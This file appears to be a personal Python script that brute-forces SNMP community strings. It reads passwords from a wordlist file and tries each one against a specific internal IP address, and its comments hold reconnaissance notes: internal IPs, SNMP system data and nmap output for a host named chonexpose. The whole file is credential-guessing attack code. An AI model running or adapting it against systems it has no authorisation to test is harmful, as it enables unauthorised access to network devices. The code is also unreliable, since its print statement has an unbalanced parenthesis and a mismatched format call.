from pysnmp.hlapi import *
#Whatever InsightVM is running on: 10.12.7.39
#My IP: 10.13.32.114
#subnet: 10.13.32.249
#DHCP server: 10.13.0.240


with open('keys.txt') as fp: # file name with passwords. One password per line
    line = fp.readline()
    cnt = 1
    while line:
        print("Line {}: {}, {}".format(cnt, line.strip('\n'))))

        errorIndication, errorStatus, errorIndex, varBinds = next(
            getCmd(SnmpEngine(),
                   CommunityData(line.strip('\n'), line.strip('\n')),
                   UdpTransportTarget(('10.31.3.140', 161)), # IP and port of snmp agent
                   ContextData(),
                   ObjectType(ObjectIdentity('1.3.6.1.2.1.1.1.0'))) # OID of MIB data
        )




        if errorIndication:
            print(errorIndication)
        elif errorStatus:
            print('%s at %s' % (errorStatus.prettyPrint(),
                        errorIndex and varBinds[int(errorIndex) - 1][0] or '?'))
        else:
            for varBind in varBinds:
                print(' = '.join([x.prettyPrint() for x in varBind]))

        line = fp.readline()
        cnt += 1

        
#lastchg:1.3.6.1.2.1.1.8.0 : SNMPv2-MIB::sysORLastChange.0 = 1
#loc:    1.3.6.1.2.1.1.6.0 : SNMPv2-MIB::sysLocation.0 = Unknown (edit /etc/snmp/snmpd.conf)
#sysname:1.3.6.1.2.1.1.5.0 : SNMPv2-MIB::sysName.0 = chonexpose
#user?:  1.3.6.1.2.1.1.4.0 : SNMPv2-MIB::sysContact.0 = Root <root@localhost> (configure /etc/snmp/snmp.local.conf)
#uptime: 1.3.6.1.2.1.1.3.0 : SNMPv2-MIB::sysUpTime.0 = 812379048
#sysObj: 1.3.6.1.2.1.1.2.0 : SNMPv2-MIB::sysObjectID.0 = SNMPv2-SMI::enterprises.8072.3.2.10
#desc:   1.3.6.1.2.1.1.1.0 : SNMPv2-MIB::sysDescr.0 = Linux chonexpose 2.6.18-419.el5 #1 SMP Wed Feb 22 22:40:57 EST 2017 x86_64
#        'SNMPv2-MIB', 'sysDescr', 0
#
# Nmap scan report for chonexpose.prant.praintl.local (10.12.7.39)
# Service Info: OS: Unix
# Linux 2.6.18

#ifP

# 1.3.6.1.2.1.2.1.0 : SNMPv2-SMI::mib-2.2.1.0 = 3
